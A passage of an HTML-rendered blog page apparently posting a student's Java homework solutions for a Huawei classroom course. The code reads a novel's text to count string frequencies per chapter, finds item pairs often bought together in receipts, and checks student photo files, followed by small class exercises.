class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.huawei.classroom.student.h07;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Closeable;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Reader;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 在本包下增加合适的类和方法，使得Test类能够测试通过 具体要求见实验一 注意 本程序不但要测试通过，还需要写适当的注释</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 不要引用jdk1.8以外第三方的包</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> cjy</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Analysis</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * </span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Analysis</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 提示 ：将一个文本文件读取到一个字符串中返回 提示：参考ch09.ReadWriteFileCharDemo.java</span></span><br><span class="line"><span class="comment">	 * </span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> filename</span></span><br><span class="line"><span class="comment">	 *            红楼梦文本文件的全路径名</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> 文本的内容</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">private</span> String <span class="title">readFromTxt</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		Reader reader = <span class="keyword">null</span>;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			StringBuffer buf = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">			<span class="keyword">char</span>[] chars = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">1024</span>];</span><br><span class="line">			reader = <span class="keyword">new</span> FileReader(filename);</span><br><span class="line">			<span class="keyword">int</span> readed = reader.read(chars);</span><br><span class="line">			<span class="keyword">while</span> (readed != -<span class="number">1</span>) &#123;</span><br><span class="line">				buf.append(chars, <span class="number">0</span>, readed);</span><br><span class="line">				readed = reader.read(chars);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> buf.toString();</span><br><span class="line">		&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">			close(reader);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 关闭输入输入流</span></span><br><span class="line"><span class="comment">	 * </span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> inout</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">(Closeable inout)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (inout != <span class="keyword">null</span>) &#123;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				inout.close();</span><br><span class="line">			&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">				<span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 将红楼梦文本文件拆分为120个章节</span></span><br><span class="line"><span class="comment">	 * </span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> content</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> 返回120个元素的字符串数组</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">private</span> String[] splitContentToChapter(String content) &#123;</span><br><span class="line">		<span class="comment">// 提示 使用 content.split(" 第[一,二,三,四,五,六,七,八,九,十,零]&#123;1,5&#125;回 ");正则表达拆分</span></span><br><span class="line">		<span class="comment">// 百度一下正则表达式</span></span><br><span class="line">		String[] contents = content.split(<span class="string">" 第[一,二,三,四,五,六,七,八,九,十,零]&#123;1,5&#125;回 "</span>);</span><br><span class="line">		String result[] = <span class="keyword">new</span> String[contents.length-<span class="number">1</span>];</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; result.length;i++) &#123;</span><br><span class="line">			result[i] = contents[i+<span class="number">1</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 统计某个字符 在一个字符串里面出现的频度</span></span><br><span class="line"><span class="comment">	 * </span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> content</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> sub</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">getCount</span><span class="params">(String content, String sub)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> count = content.split(sub).length-<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">return</span> count;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 计算红楼梦中某个字符串 str 出现的频率</span></span><br><span class="line"><span class="comment">	 * </span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> filename</span></span><br><span class="line"><span class="comment">	 *            存放了红楼梦这本书的文本文件名</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> str</span></span><br><span class="line"><span class="comment">	 *            要统计的字符串</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> 一个长度是120的一维数组</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">int</span>[] getStringFrequent(String filename, String str) &#123;</span><br><span class="line">		<span class="comment">// 提示 1 readFromTxt 得到小说的内容</span></span><br><span class="line">		String text = <span class="keyword">null</span>;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			text = readFromTxt(filename);</span><br><span class="line">		&#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">			System.out.println(<span class="string">"error"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 提示 2 splitContentToChapter 得到每章内容</span></span><br><span class="line">		String[] subText = splitContentToChapter(text);</span><br><span class="line">		<span class="comment">// 提示 3 针对每章 调用 getCount方法</span></span><br><span class="line">		<span class="keyword">int</span>[] counts = <span class="keyword">new</span> <span class="keyword">int</span>[subText.length];</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; counts.length;i++) &#123;</span><br><span class="line">			counts[i] = getCount(subText[i],str);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> counts;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="Home08"><a href="#Home08" class="headerlink" title="Home08"></a>Home08</h3><ul>
<li>DataUtil.java<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.huawei.classroom.student.h08;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Reader;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DataUtil</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">DataUtil</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 提示 本方法能够从一个文本文件中读取每一行，将每一行放到一个List&lt;String&gt;返回</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> detailFileName</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">private</span> List&lt;String&gt; <span class="title">readFromFile</span><span class="params">(String detailFileName)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">		Reader reader;</span><br><span class="line">		BufferedReader bReader = <span class="keyword">null</span>;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			reader = <span class="keyword">new</span> FileReader(detailFileName);</span><br><span class="line">			bReader = <span class="keyword">new</span> BufferedReader(reader);</span><br><span class="line">			List&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line"></span><br><span class="line">			String line = bReader.readLine();</span><br><span class="line">			<span class="keyword">while</span> (<span class="keyword">null</span> != line) &#123;</span><br><span class="line">				list.add(line);</span><br><span class="line">				line = bReader.readLine();</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> list;</span><br><span class="line">		&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (bReader != <span class="keyword">null</span>) &#123;</span><br><span class="line">				bReader.close();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * detailFileName文件是一个超市的购物小票 每行表示一次购物，每个商品之间用半角逗号分开 请找出 “哪 两个商品总被同时 购买"</span></span><br><span class="line"><span class="comment">	 * 将这两个商品名字用逗号分隔 返回</span></span><br><span class="line"><span class="comment">	 * </span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> detailFileName</span></span><br><span class="line"><span class="comment">	 *            购物小票的文件名</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> 哪 两个商品总被同时 购买,两个商品之间用半角逗号分隔</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getFrequentItem</span><span class="params">(String detailFileName)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		List&lt;String&gt; list = readFromFile(detailFileName);</span><br><span class="line">		HashSet&lt;String&gt; space = <span class="keyword">new</span> HashSet&lt;String&gt;();</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; list.size();i++) &#123;</span><br><span class="line">			String[] tmp = list.get(i).split(<span class="string">","</span>);</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; tmp.length;j++) &#123;</span><br><span class="line">				space.add(tmp[j]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">int</span> tmp=<span class="number">0</span>,size=space.size(),count=<span class="number">0</span>;</span><br><span class="line">		String[] store = <span class="keyword">new</span> String[size];</span><br><span class="line">		<span class="keyword">for</span>(Iterator&lt;String&gt; it=space.iterator();it.hasNext();) &#123;</span><br><span class="line">			store[tmp++] = it.next();</span><br><span class="line">		&#125;</span><br><span class="line">		String name1,name2,ans=<span class="keyword">null</span>;</span><br><span class="line">		tmp = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; size;i++) &#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; size;j++) &#123;</span><br><span class="line">				<span class="keyword">if</span>(j==i) &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;<span class="keyword">else</span> &#123;	</span><br><span class="line">					name1 = store[i];name2 = store[j];</span><br><span class="line">					tmp = <span class="number">0</span>;</span><br><span class="line">					<span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>;k &lt; list.size();k++) &#123;</span><br><span class="line">						String item = list.get(k);</span><br><span class="line">						<span class="keyword">if</span>(item.indexOf(name1)!=-<span class="number">1</span>&amp;&amp;item.indexOf(name2)!=-<span class="number">1</span>) &#123;</span><br><span class="line">							tmp++;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					ans=tmp&gt;count?name1+<span class="string">","</span>+name2:ans;</span><br><span class="line">					count=tmp&gt;count?tmp:count;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> ans;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="Home09"><a href="#Home09" class="headerlink" title="Home09"></a>Home09</h3><ul>
<li>MyTool.java<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.huawei.classroom.student.h09;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.io.Reader;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 在本包下增加合适的类和方法， 本程序不但要测试通过，还需要写适当的注释</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 不要引用jdk1.8以外第三方的包</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yjn</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyTools</span> </span>&#123;</span><br><span class="line">	String picDir;</span><br><span class="line">	String contentOfTxt;</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * </span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> studentListFile  存放学生名单的文件名</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> picDir 图片存放的目录（不会包含子目录）</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">MyTools</span><span class="params">(String studentListFile,String picDir)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.picDir = picDir;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="keyword">this</span>.contentOfTxt = readFromTxt(studentListFile);</span><br><span class="line">		&#125;<span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">private</span> String <span class="title">readFromTxt</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">		Reader reader = <span class="keyword">null</span>;</span><br><span class="line">		StringBuffer buf = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">		<span class="keyword">char</span>[] chars = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">1024</span>];</span><br><span class="line">		reader = <span class="keyword">new</span> FileReader(filename);</span><br><span class="line">		<span class="keyword">int</span> readed = reader.read(chars);</span><br><span class="line">		<span class="keyword">while</span> (readed != -<span class="number">1</span>) &#123;</span><br><span class="line">			buf.append(chars, <span class="number">0</span>, readed);</span><br><span class="line">			readed = reader.read(chars);</span><br><span class="line">		&#125;</span><br><span class="line">		reader.close();</span><br><span class="line">		<span class="keyword">return</span> buf.toString();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> Set&lt;String&gt; <span class="title">getOverSizeStudentList</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		File dir = <span class="keyword">new</span> File(picDir);</span><br><span class="line">		File[] fileList = dir.listFiles();</span><br><span class="line">		Set&lt;String&gt; set = <span class="keyword">new</span> HashSet&lt;String&gt;();</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; fileList.length;i++) &#123;</span><br><span class="line">			<span class="keyword">if</span>(fileList[i].length() &gt; <span class="number">128</span> * <span class="number">1024</span>) &#123;</span><br><span class="line">				String name = fileList[i].getName();</span><br><span class="line">				<span class="keyword">int</span> index = name.indexOf(<span class="string">'.'</span>);</span><br><span class="line">				set.add(name.substring(<span class="number">0</span>,index));</span><br><span class="line">				&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> set;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> Set&lt;String&gt; <span class="title">getNoPicStudentList</span><span class="params">()</span>  <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		<span class="comment">//String students = readFromTxt(this.studentListFileName);</span></span><br><span class="line">		File dir = <span class="keyword">new</span> File(picDir);</span><br><span class="line">		File[] fileList = dir.listFiles();</span><br><span class="line">		Set&lt;String&gt; set = <span class="keyword">new</span> HashSet&lt;String&gt;();</span><br><span class="line">		String[] items = <span class="keyword">this</span>.contentOfTxt.split(<span class="string">"\n"</span>); </span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; items.length;i++) &#123;</span><br><span class="line">			String number = (items[i]).split(<span class="string">"\t"</span>)[<span class="number">0</span>];</span><br><span class="line">			<span class="keyword">boolean</span> flag = <span class="keyword">true</span>;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; fileList.length;j++) &#123;</span><br><span class="line">				String name = fileList[j].getName();</span><br><span class="line">				<span class="keyword">int</span> index = name.indexOf(<span class="string">'.'</span>);</span><br><span class="line">				<span class="keyword">if</span>(name.substring(<span class="number">0</span>,index).equals(number)) &#123;</span><br><span class="line">					flag = <span class="keyword">false</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(flag) &#123;</span><br><span class="line">				set.add(number);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> set;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="Home10"><a href="#Home10" class="headerlink" title="Home10"></a>Home10</h3><h4 id="q1"><a href="#q1" class="headerlink" title="q1"></a>q1</h4><ul>
<li>Dog.java<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.huawei.classroom.student.h10.q01;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Dog</span> </span>&#123;</span><br><span class="line">	Dog()&#123;		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">speak</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"wangwang"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h4 id="q2"><a href="#q2" class="headerlink" title="q2"></a>q2</h4><ul>
<li><p>Person.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.huawei.classroom.student.h10.q02;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Student.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.huawei.classroom.student.h10.q02;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">implements</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">	String name;</span><br><span class="line">	Student(String name)&#123;</span><br><span class="line">		<span class="keyword">this</span>.name = name;</span><br><span class="line">	&#125;</span><br><span class="line">	Student()&#123;</span><br><span class="line">		<span class="keyword">this</span>(<span class="string">"youjianing"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h4 id="q3"><a href="#q3" class="headerlink" title="q3"></a>q3</h4><ul>
<li>ArrayUtil.java<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.huawei.classroom.student.h10.q03;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayUtil</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">ArrayUtil</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getMin</span><span class="params">(<span class="keyword">int</span>[] array)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> tmp = <span class="number">2147483647</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; array.length;i++) &#123;</span><br><span class="line">			tmp = array[i]&lt;tmp?array[i]:tmp;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> tmp;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h4 id="q4"><a href="#q4" class="headerlink" title="q4"></a>q4</h4><ul>
<li>StrUtil.java<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.huawei.classroom.student.h10.q04;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StrUtil</span> </span>&#123;</span><br><span class="line">	StrUtil()&#123;		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">removeDulpicatedChar</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">		String ans = <span class="string">""</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; s.length();i++) 